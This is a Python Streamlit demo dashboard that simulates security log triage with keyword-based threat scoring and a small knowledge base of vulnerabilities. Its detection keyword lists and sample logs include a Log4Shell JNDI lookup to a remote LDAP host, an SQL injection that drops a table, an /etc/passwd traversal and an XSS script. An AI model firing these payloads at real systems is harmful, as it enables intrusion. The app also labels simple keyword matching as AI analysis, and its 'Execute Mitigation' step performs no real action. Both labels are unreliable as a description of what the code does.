import streamlit as st
import pandas as pd
import plotly.graph_objects as go
import time
import random
import re
from datetime import datetime

# ==============================================================================
# 🧠 BACKEND LOGIC (Simulating rag_pipeline.py & threat_scoring.py)
# ==============================================================================

# --- 1. LOCAL KNOWLEDGE BASE (The "Brain") ---
# This acts as your Vector DB. It contains real vulnerability data.
KNOWLEDGE_BASE = [
    {
        "id": "CVE-2021-44228",
        "name": "Log4Shell",
        "keywords": ["jndi", "ldap", "log4j"],
        "description": "Remote Code Execution via JNDI injection in Apache Log4j.",
        "mitigation": "Upgrade to Log4j 2.17.1+. Block outbound LDAP traffic (port 389).",
        "severity": "Critical"
    },
    {
        "id": "OWASP-SQLi",
        "name": "SQL Injection",
        "keywords": ["union", "select", "or 1=1", "drop table", "--"],
        "description": "Untrusted data in database query allows data exfiltration.",
        "mitigation": "Use Prepared Statements (Parameterized Queries). Enable WAF SQLi rules.",
        "severity": "High"
    },
    {
        "id": "CWE-79",
        "name": "Cross-Site Scripting (XSS)",
        "keywords": ["script", "alert(", "document.cookie", "onerror"],
        "description": "Injection of malicious scripts into trusted web pages.",
        "mitigation": "Sanitize input. Use Content Security Policy (CSP). Encode output.",
        "severity": "Medium"
    },
    {
        "id": "CWE-22",
        "name": "Path Traversal",
        "keywords": ["../", "..%2f", "/etc/passwd", "boot.ini"],
        "description": "Access to files and directories outside the web root.",
        "mitigation": "Validate file paths. Run service with least privilege.",
        "severity": "High"
    },
    {
        "id": "MITRE-T1110",
        "name": "Brute Force",
        "keywords": ["failed password", "invalid user", "repeated login"],
        "description": "Repeated attempts to guess credentials.",
        "mitigation": "Implement Rate Limiting. Enable Account Lockout policies.",
        "severity": "Medium"
    }
]

# --- 2. DYNAMIC SCORING ENGINE ---
def calculate_threat_score(log_text):
    """
    Calculates a score (0-100) based on REAL text analysis, not random numbers.
    """
    text = log_text.lower()
    score = 10  # Base noise level
    
    # Keyword weights
    weights = {
        "jndi": 90, "ldap": 85,             # Critical RCE
        "union select": 80, "or 1=1": 75,   # SQLi
        "/etc/passwd": 85, "../": 70,       # Path Traversal
        "script>": 60, "alert(": 60,        # XSS
        "failed": 20, "error": 15           # Noise
    }
    
    # Calculate Score
    detected_patterns = []
    for key, weight in weights.items():
        if key in text:
            score += weight
            detected_patterns.append(key)
    
    # Cap at 100
    return min(99, score), detected_patterns

# --- 3. RETRIEVAL ENGINE (The "RAG" Logic) ---
def retrieve_knowledge(log_text):
    """
    Finds the best matching document from KNOWLEDGE_BASE based on keyword overlap.
    """
    log_lower = log_text.lower()
    best_match = None
    max_overlap = 0
    
    for doc in KNOWLEDGE_BASE:
        overlap = sum(1 for k in doc['keywords'] if k in log_lower)
        if overlap > max_overlap:
            max_overlap = overlap
            best_match = doc
            
    # Fallback if no specific keywords match
    if not best_match:
        best_match = {
            "id": "UNKNOWN-THREAT",
            "name": "Anomalous Traffic",
            "description": "Pattern matches heuristic anomaly but no specific signature.",
            "mitigation": "Investigate Source IP. Review full TCP stream.",
            "severity": "Low"
        }
    return best_match

# ==============================================================================
# 🖥️ FRONTEND (Streamlit Dashboard)
# ==============================================================================

# --- PAGE CONFIG ---
st.set_page_config(page_title="SecOps AI | Real-Time", page_icon="🛡️", layout="wide")

# --- STATE MANAGEMENT (The "Database") ---
if 'alerts' not in st.session_state:
    st.session_state['alerts'] = []  # Active Threats
if 'history' not in st.session_state:
    st.session_state['history'] = [] # Mitigated Threats
if 'log_stream' not in st.session_state:
    st.session_state['log_stream'] = [
        "2024-10-25 10:01:22 GET /index.html 200 OK",
        "2024-10-25 10:02:15 POST /login.php user=admin",
    ]

# --- CUSTOM CSS ---
st.markdown("""
<style>
    .stApp { background-color: #0e1117; color: white; }
    .stButton>button { width: 100%; border-radius: 5px; }
    div[data-testid="stMetric"] { background-color: #1f2937; padding: 10px; border-radius: 8px; border: 1px solid #374151; }
    .risk-critical { color: #ef4444; font-weight: bold; }
    .risk-high { color: #f97316; font-weight: bold; }
    .risk-safe { color: #22c55e; font-weight: bold; }
</style>
""", unsafe_allow_html=True)

# --- SIDEBAR: SIMULATION CONTROL ---
with st.sidebar:
    st.title("🕹️ Simulation Control")
    st.markdown("Use these controls to inject data dynamically.")
    
    # 1. INJECT ATTACK
    st.subheader("1. Inject Attack")
    attack_type = st.selectbox("Select Attack Vector", 
                               ["Log4Shell (RCE)", "SQL Injection", "Path Traversal", "XSS Scripting"])
    
    if st.button("🔥 Inject Malicious Log"):
        # Generate dynamic log based on selection
        timestamp = datetime.now().strftime("%H:%M:%S")
        if attack_type == "Log4Shell (RCE)":
            raw_log = f"{timestamp} GET /?x=${{jndi:ldap://192.168.1.55/exploit}} HTTP/1.1 200"
        elif attack_type == "SQL Injection":
            raw_log = f"{timestamp} POST /login payload=' OR 1=1;-- DROP TABLE users"
        elif attack_type == "Path Traversal":
            raw_log = f"{timestamp} GET /images/..%2f..%2fetc/passwd HTTP/1.1 403"
        else:
            raw_log = f"{timestamp} GET /search?q=<script>alert('pwned')</script> HTTP/1.1"
            
        # Add to State
        score, patterns = calculate_threat_score(raw_log)
        new_alert = {
            "id": len(st.session_state['alerts']) + len(st.session_state['history']) + 1,
            "timestamp": timestamp,
            "raw_log": raw_log,
            "score": score,
            "patterns": patterns,
            "status": "Active"
        }
        st.session_state['alerts'].append(new_alert)
        st.success("Log Injected into Queue!")

    st.divider()
    st.metric("Active Threats", len(st.session_state['alerts']))
    st.metric("Mitigated", len(st.session_state['history']))

# --- MAIN DASHBOARD ---
st.title("🛡️ Real-Time Threat Prioritization System")

# 1. TOP METRICS
c1, c2, c3, c4 = st.columns(4)
avg_score = 0
if st.session_state['alerts']:
    avg_score = sum(a['score'] for a in st.session_state['alerts']) / len(st.session_state['alerts'])

c1.metric("System Status", "Live Monitoring", "Active")
c2.metric("Queue Depth", f"{len(st.session_state['alerts'])} Logs")
c3.metric("Avg Threat Score", f"{avg_score:.1f}", delta_color="inverse")
c4.metric("Mitigation Rate", f"{len(st.session_state['history'])} Fixed")

st.markdown("---")

# 2. PRIORITY QUEUE (The "Meat" of the Demo)
st.subheader("🚨 Priority Threat Queue")

if not st.session_state['alerts']:
    st.info("✅ System Clean. No active threats detected. Inject an attack from the sidebar to test.")
else:
    # SORT: Critical stuff floats to top automatically
    sorted_alerts = sorted(st.session_state['alerts'], key=lambda x: x['score'], reverse=True)
    
    # Display Top 3
    for i, alert in enumerate(sorted_alerts[:3]):
        
        # Determine Color
        color = "red" if alert['score'] > 80 else "orange" if alert['score'] > 50 else "green"
        
        with st.expander(f"🔴 ALERT #{alert['id']} | Risk: {alert['score']}/100 | {alert['timestamp']}", expanded=(i==0)):
            
            c_left, c_right = st.columns([2, 1])
            
            with c_left:
                st.code(alert['raw_log'], language="http")
                st.markdown(f"**Detected Patterns:** `{alert['patterns']}`")
                
            with c_right:
                # DYNAMIC ANALYSIS BUTTON
                if st.button(f"🔍 Analyze & Mitigate #{alert['id']}", key=f"btn_{alert['id']}"):
                    
                    # 1. RETRIEVE KNOWLEDGE
                    doc = retrieve_knowledge(alert['raw_log'])
                    
                    st.session_state[f"analysis_{alert['id']}"] = doc
            
            # SHOW ANALYSIS IF AVAILABLE
            if f"analysis_{alert['id']}" in st.session_state:
                doc = st.session_state[f"analysis_{alert['id']}"]
                
                st.markdown("#### 🧠 AI Analysis (RAG Output)")
                st.info(f"**Identified Threat:** {doc['name']} ({doc['id']})")
                st.write(f"**Context:** {doc['description']}")
                
                st.markdown("#### 🛠️ Generated Mitigation Plan")
                st.success(f"**Action:** {doc['mitigation']}")
                
                # FINAL MITIGATE ACTION
                if st.button(f"✅ Execute Mitigation for #{alert['id']}", key=f"fix_{alert['id']}"):
                    # Move to History
                    alert['status'] = "Mitigated"
                    alert['mitigated_at'] = datetime.now().strftime("%H:%M:%S")
                    st.session_state['history'].append(alert)
                    st.session_state['alerts'].remove(alert)
                    st.rerun() # REFRESH PAGE TO UPDATE LIST

# 3. HISTORY VIEW
if st.session_state['history']:
    st.markdown("---")
    st.subheader("📜 Mitigation History")
    df = pd.DataFrame(st.session_state['history'])
    st.dataframe(df[['id', 'timestamp', 'mitigated_at', 'score', 'status']])